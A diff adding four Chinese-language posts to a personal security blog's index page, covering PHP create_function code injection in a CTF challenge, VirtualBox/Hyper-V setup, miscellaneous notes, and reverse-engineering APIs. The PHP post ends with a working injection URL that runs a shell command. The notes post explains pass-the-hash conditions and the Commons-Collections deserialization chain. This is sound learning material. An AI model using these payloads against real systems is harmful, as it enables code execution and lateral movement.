@@ -145,6 +145,405 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/10/PHP%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E4%B9%8Bcreate-function/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="s0nnse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0nnse">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/07/10/PHP%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E4%B9%8Bcreate-function/" class="post-title-link" itemprop="url">PHP代码中的危险函数之create_function</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-07-10 22:36:56 / Modified: 22:44:20" itemprop="dateCreated datePublished" datetime="2020-07-10T22:36:56+08:00">2020-07-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><h4 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h4><p>create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用，类似于Java、Python中的Lambda表达式。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure>
+
+<p>string $args 变量部分<br>string $code 方法代码部分</p>
+<h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 123'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>等价于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>利用create_function可以进行代码注入</p>
+<p>看一道<a href="https://code-breaking.com/" target="_blank" rel="noopener">code-breaking</a>的一道PHP题</p>
+<p>先贴一下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里需要先绕过正则匹配，需要绕过正则的话需要在create_function函数的首或者尾增加一个不在匹配范围内的字符，而且不能影响函数的正常调用。</p>
+<p>这里引入PHP命名空间(namespace)</p>
+<p>PHP 命名空间(namespace)是在PHP 5.3中加入的，如果你学过C#和Java，那命名空间就不算什么新事物。 不过在PHP当中还是有着相当重要的意义。</p>
+<p>PHP 命名空间可以解决以下两类问题：</p>
+<ol>
+<li><p>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</p>
+</li>
+<li><p>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MyProject</span>\<span class="title">Sub</span>\<span class="title">Level</span>;  <span class="comment">//声明分层次的单个命名空间</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>默认情况下，所有常量、类和函数名都放在全局空间下，就和PHP支持命名空间之前一样。</strong></p>
+<p>所以create_function可以用\create_function进行代替</p>
+<p>先测试一下<code>\</code>的效果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"123"</span>);</span><br><span class="line">\printf(<span class="string">"456"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>通过输出可以看到<code>printf</code>和<code>\printf</code>执行结果是一样的，那么这里使用<code>\create_function</code>来绕过正则匹配。</p>
+<p>这里如果我们想要执行任意代码，就首先需要跳出这个函数定义。即在<code>return 123;</code>后添加<code>}</code>让函数定义结束，在插入我们想要执行的代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\create_function(<span class="string">''</span>, <span class="string">'return 123;&#125; printf(`dir`);//'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里补充一点：</p>
+<p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 <a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank" rel="noopener">shell_exec()</a> 相同。</p>
+<p>最后的POC应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;\create_function&amp;arg&#x3D;return%202333;&#125;%20printf(&#96;dir&#96;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/10/virtualbox6%E5%92%8Chypre-v%E5%85%B1%E5%AD%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="s0nnse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0nnse">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/07/10/virtualbox6%E5%92%8Chypre-v%E5%85%B1%E5%AD%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" class="post-title-link" itemprop="url">virtualbox6和hypre-v共存解决办法</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-07-10 22:36:45 / Modified: 22:43:45" itemprop="dateCreated datePublished" datetime="2020-07-10T22:36:45+08:00">2020-07-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近尝试使用了微软的WSL2，体验非常好，但同时还要使用VrtualBox会和wsl2使用的Hyper-v冲突，造成VrtualBox不能正常使用。原因是Hyper-v的虚拟方式不一样，开启Hyper-v后会将用户的桌面系统给虚拟化，用户的桌面系统就会成为Hyper-v的虚拟系统，而Hyper-v的虚拟系统是不允许再开虚拟机的，因此开启Hyper-v后VM和Vbox就不能运行。</p>
+<img src="/images/virtualbox6和hypre-v共存解决办法/虚拟区别对比.jpg" alt="虚拟区别对比" style="zoom: 80%;" />
+
+
+<p>而Vbox在第六个版本（Vbox6.0）中新增了利用Hyper-v的api进行虚拟化系统</p>
+<p>这个功能还是实验性的功能，可能会出现意想不到的问题，出现问题请向官方反馈以助于完善。</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>前提要求：</p>
+<ol>
+<li>Windows 版本: 2004+</li>
+<li>VirtualBox 版本: 6.0+</li>
+<li>CPU启用虚拟化</li>
+</ol>
+<p>由于这个功能还是实验性的功能，所以没有现成的GUI按钮或界面开启这个功能，需要使用命令行开启。<br>找到vbox的安装目录，确定目录下有<code>VBoxManage.exe</code><br>在该目录打开命令行工具（目录空白位置按住shift 鼠标点击右键，选择<code>在此处打开命令窗口</code>或<code>在此处打开PwerShell窗口</code>）<br>命令窗口(cmd)输入：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">指定vbox下的虚拟系统开启这个功能</span></span><br><span class="line">VBoxManage setextradata "&lt;虚拟机名字&gt;" "VBoxInternal/NEM/UseRing0Runloop" 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">或指定vbox所有虚拟系统开启</span></span><br><span class="line">VBoxManage setextradata global "VBoxInternal/NEM/UseRing0Runloop" 0</span><br></pre></td></tr></table></figure>
+
+<p>PowerShell需要加<code>./</code>和<code>.exe</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定vbox下的虚拟系统开启这个功能</span></span><br><span class="line">./VBoxManage.exe setextradata <span class="string">"&lt;虚拟机名字&gt;"</span> <span class="string">"VBoxInternal/NEM/UseRing0Runloop"</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或指定vbox所有虚拟系统开启</span></span><br><span class="line">./VBoxManage.exe setextradata global <span class="string">"VBoxInternal/NEM/UseRing0Runloop"</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>开启后，就可以同时使用Hyper-v和Vbox。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/10/%E6%9D%82%E9%A1%B9%E5%A4%87%E5%BF%98%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="s0nnse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0nnse">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/07/10/%E6%9D%82%E9%A1%B9%E5%A4%87%E5%BF%98%E5%BD%95/" class="post-title-link" itemprop="url">杂项备忘录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-07-10 22:36:38 / Modified: 22:40:26" itemprop="dateCreated datePublished" datetime="2020-07-10T22:36:38+08:00">2020-07-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>所有内容是开发、渗透、漏洞研究过程中的片段笔记，无上下文，非完整内容。</p>
+<h5 id="1、使用olivere-elastic连接远程elasticsearch失败"><a href="#1、使用olivere-elastic连接远程elasticsearch失败" class="headerlink" title="1、使用olivere/elastic连接远程elasticsearch失败"></a>1、使用<a href="https://github.com/olivere/elastic">olivere/<em>elastic</em></a>连接远程elasticsearch失败</h5><p>使用<a href="https://github.com/olivere/elastic">olivere/<em>elastic</em></a>连接elasticsearch时，发现连接地址明明输入的时候是公网地址，但是连接时会自动转换成内网地址或者docker中的ip地址，导致服务连接不上。</p>
+<p>解决办法：</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client, _ := elastic.NewClient(</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 将sniff设置为false后，便不会自动转换地址</span></span><br><span class="line">   elastic.SetSniff(<span class="literal">false</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、使用gopacket编写代码后进行交叉编译失败。"><a href="#2、使用gopacket编写代码后进行交叉编译失败。" class="headerlink" title="2、使用gopacket编写代码后进行交叉编译失败。"></a>2、使用gopacket编写代码后进行交叉编译失败。</h5><p>原因：因为gopacket在windows下需要使用winpack，而linux下需要使用libpacp依赖，进行交叉编译的时候会因为依赖问题无法进行交叉编译。</p>
+<p>解决办法：分别在windows、linux环境下各自编译。</p>
+<h5 id="3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。"><a href="#3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。" class="headerlink" title="3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。"></a>3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。</h5><p>原因：当某个线程池active==threads时，表示所有线程都在忙，那么后续新的请求就会进入queue中，即queue&gt;0，一旦queue大小超出限制，如bulk的queue默认50，那么elasticsearch进程将拒绝请求（返回HTTP状态码429），相应的拒绝次数就会累加到rejected中。</p>
+<p>Elasticsearch核心线程池有index、search、get、bulk等，具体作用如下。</p>
+<ul>
+<li>index：此线程池用于索引和删除操作。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为300。</li>
+<li>search：此线程池用于搜索和计数请求。它的类型默认为fixed，size默认为可用处理器的数量乘以3，队列的size默认为1000。</li>
+<li>suggest：此线程池用于建议器请求。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为1000。</li>
+<li>get：此线程池用于实时的GET请求。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为1000。</li>
+<li>bulk：此线程池用于批量操作。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为50。</li>
+<li>percolate：此线程池用于预匹配器操作。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为1000。</li>
+</ul>
+<p>其中的线程池类型cache和fixed含义如下。</p>
+<ul>
+<li>cache<br>无限制的线程池，为每个请求创建一个线程。</li>
+<li>fixed<br>有着固定大小的线程池，大小由size属性指定，允许你指定一个队列（使用queue_size属性指定）用来保存请求，直到有一个空闲的线程来执行请求。如果Elasticsearch无法把请求放到队列中（队列满了），该请求将被拒绝。</li>
+</ul>
+<p>解决方法：尽量不改动线程池大小，对于线程池的调整原理，可参考数据库连接池大小的调整原理，其基本结论就是，池的大小跟CPU核心数息息相关，通常不要高于<code>2*CPU核心数</code>，过高就会产生反作用。这里可以设置queue的大小。</p>
+<p>修改elasticsearch.yml，增大写入时的队列大小</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">thread_pool.write.queue_size:</span> <span class="number">50000</span></span><br></pre></td></tr></table></figure>
+
+<p>当还是存在问题的时候使用filebeat完成日志的远程写入，Filebeat是本地文件的日志数据采集器，可监控日志目录或特定日志文件（tail file），并将它们转发给Elasticsearch或Logstatsh进行索引、kafka等。带有内部模块（auditd，Apache，Nginx，System和MySQL），可通过一个指定命令来简化通用日志格式的收集，解析和可视化。</p>
+<h5 id="4、docker常用命令"><a href="#4、docker常用命令" class="headerlink" title="4、docker常用命令"></a>4、docker常用命令</h5><p>搜索镜像：docker search [组件/应用/系统]</p>
+<p>拉取镜像：docker pull [镜像名:版本]</p>
+<p>创建容器：docker run –name [容器名] -p [主机端口:容器端口] -v [主机目录:容器目录] -e [配置] -d [镜像名:版本]</p>
+<p>进入容器：docker exec -it [容器id/容器名] /bin/bash</p>
+<p>启动容器：docker start [容器id/容器名]</p>
+<p>停止容器：docker stop [容器id/容器名]</p>
+<p>重启容器：docker restart [容器id/容器名]</p>
+<h5 id="5、哈希传递攻击适用情况："><a href="#5、哈希传递攻击适用情况：" class="headerlink" title="5、哈希传递攻击适用情况："></a>5、哈希传递攻击适用情况：</h5><p>在工作组环境中：</p>
+<ul>
+<li><p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>
+</li>
+<li><p>Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。</p>
+</li>
+</ul>
+<p>在域环境中：</p>
+<ul>
+<li>只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。</li>
+</ul>
+<p>造成的差异由KB2871997补丁产生</p>
+<p>微软在2014年5月发布了 KB2871997 和 KB2928120 两个补丁。KB2871997针对PTH攻击，而 KB2928120 针对GPP(Group Policy Preference)。KB2871997 补丁将使本地帐号不再可以用于远程接入系统，不管是 Network logon 还是 Interactive login。其后果就是：无法通过本地管理员权限对远程计算机使用 Psexec、WMI、smbexec、IPC 等，也无法访问远程主机的文件共享等。</p>
+<p>在实际测试中，更新KB2871997之后，发现无法使用常规的哈希传递方法进行横向移动，但 administrator(SID=500) 账号例外，使用该账号的散列值依然可以进行哈希传递攻击。这里需要强调的是 SID=500 的账号。即使将administrator账号改名，也不会影响SID的值。所以，如果攻击者使用SID为500的账号进行哈希传递攻击，就不会受到KB2871997的影响。</p>
+<h5 id="5、各版本JDK"><a href="#5、各版本JDK" class="headerlink" title="5、各版本JDK"></a>5、各版本JDK</h5><ul>
+<li>java SE 1.6各个版本 jdk </li>
+</ul>
+<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html</a></p>
+<ul>
+<li>java SE 1.7各个版本 jdk </li>
+</ul>
+<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html</a></p>
+<ul>
+<li>java SE 1.8各个版本 jdk </li>
+</ul>
+<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html</a></p>
+<h5 id="6、java反序列化"><a href="#6、java反序列化" class="headerlink" title="6、java反序列化"></a>6、java反序列化</h5><ul>
+<li>危险的基础库：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload <span class="number">1.3</span><span class="number">.1</span></span><br><span class="line">commons-io <span class="number">2.4</span></span><br><span class="line">commons-collections <span class="number">3.1</span></span><br><span class="line">commons-logging <span class="number">1.2</span></span><br><span class="line">commons-beanutils <span class="number">1.9</span><span class="number">.2</span></span><br><span class="line">org.slf4j:slf4j-api <span class="number">1.7</span><span class="number">.21</span></span><br><span class="line">com.mchange:mchange-commons-java <span class="number">0.2</span><span class="number">.11</span></span><br><span class="line">org.apache.commons:commons-collections <span class="number">4.0</span></span><br><span class="line">com.mchange:c3p0 <span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span></span><br><span class="line">org.beanshell:bsh <span class="number">2.0</span>b5</span><br><span class="line">org.codehaus.groovy:groovy <span class="number">2.3</span><span class="number">.9</span></span><br><span class="line">org.springframework:spring-aop <span class="number">4.1</span><span class="number">.4</span>.RELEASE</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输入点的常用函数：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="comment">// 流转化为Object</span></span><br><span class="line">ObjectInputStream.readUnshared <span class="comment">// 流转化为Object</span></span><br><span class="line">XMLDecoder.readObject <span class="comment">// 读取xml转化为Object</span></span><br><span class="line">Yaml.load<span class="comment">// yaml字符串转Object</span></span><br><span class="line">XStream.fromXML<span class="comment">// XStream用于Java Object与xml相互转化</span></span><br><span class="line">ObjectMapper.readValue<span class="comment">// jackson中的api</span></span><br><span class="line">JSON.parseObject<span class="comment">// fastjson中的api</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>但在某些情况下可能是更高的数字。</p>
+<p>Commons-Collections各个版本下载地址：<a href="http://archive.apache.org/dist/commons/collections/source/" target="_blank" rel="noopener">http://archive.apache.org/dist/commons/collections/source/</a></p>
+<ul>
+<li>触发反序列化漏洞条件：<br>（1）使用了InvokeTransformer的对象，并在transform方法里执行代码；<br>（2）使用TransformedMap通过执行setValue方法来触发transform方法。<br><strong>我们要触发TransformedMap的putAll/put/checkSetValue方法(其中任意一种)</strong><br>Apache Commons Collections中有一个特殊的接口，其中有一个实现该接口的类可以通过调用Java的反射机制来<strong>调用任意函数</strong>，叫做InvokerTransformer。<br>InvokeTransformer方法提供了将一个对象转换到另一个对象，或者在转换的时候调整对象的属性等方法。执行代码的时候会经过两次反射，一次是InvokerTransformer的反射，在一次是插入的恶意代码的反射。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>前一个object会做为下一个的参数传入，所有可以进行类-&gt;方法-&gt;执行的调用。</p>
+<p>POC执行流程为 TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()- 漏洞成功触发，<strong><em>jdk&lt;=7</em></strong><br>(1)java方法重写：如果一个类的方法被重写，那么调用该方法时优先调用该方法<br>(2)JAVA反射机制：在运行状态中<br>　　　　　　　　　　　　　对于任意一个类，都能够判断一个对象所属的类；<br>　　　　　　　　　　　　　对于任意一个类，都能够知道这个类的所有属性和方法；<br>　　　　　　　　　  　 　      对于任意一个对象，都能够调用它的任意一个方法和属性；<br>(3)认识关键类与函数<br>    TransformedMap ：      利用其value修改时触发transform()的特性<br>    ChainedTransformer： 会挨个执行我们定义的Transformer<br>    Transformer:                 存放我们要执行的命令<br>    AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数</p>
+<p> 要通过外部触发这条攻击链，需要实现的目标有三个<br> 1)触发put/putAll/checkSetValue(这个只能传入参数至valueTransformer)任意方法其一<br> 2)找到某个可序列化的类，重写了readObject方法<br> 3)readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的</p>
+<h5 id="7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包"><a href="#7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包" class="headerlink" title="7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包"></a>7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包</h5><p>原因：Tshark设置any网卡进行抓包时，因为docker会自动在虚拟出虚拟网卡，会造成抓到多个重复包。</p>
+<p>解决方法：设置物理网卡或者需要抓取流量的docker容器对应的虚拟网卡。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/08/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="s0nnse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0nnse">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/07/08/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">逆向学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-07-08 22:18:33 / Modified: 22:28:52" itemprop="dateCreated datePublished" datetime="2020-07-08T22:18:33+08:00">2020-07-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>读取文本框的函数：</p>
+<table>
+<thead>
+<tr>
+<th>16位</th>
+<th>32位（ANSI版）</th>
+<th>32位（Unicode版）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GetDlgItemText</td>
+<td>GetDlgItemTextA</td>
+<td>GetDlgItemTextW</td>
+</tr>
+<tr>
+<td>GetWindowText</td>
+<td>GetWindowTextA</td>
+<td>GetWindowTextW</td>
+</tr>
+</tbody></table>
+<p>显示窗口的函数：</p>
+<p>MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)</p>
+<p>对话框函数：</p>
+<p>DialogBoxParam（打开对话框）、EndDialog（关闭对话框）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/06/13/Java%E6%8E%A2%E9%92%88-Java-Agent%E6%8A%80%E6%9C%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -892,12 +1291,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
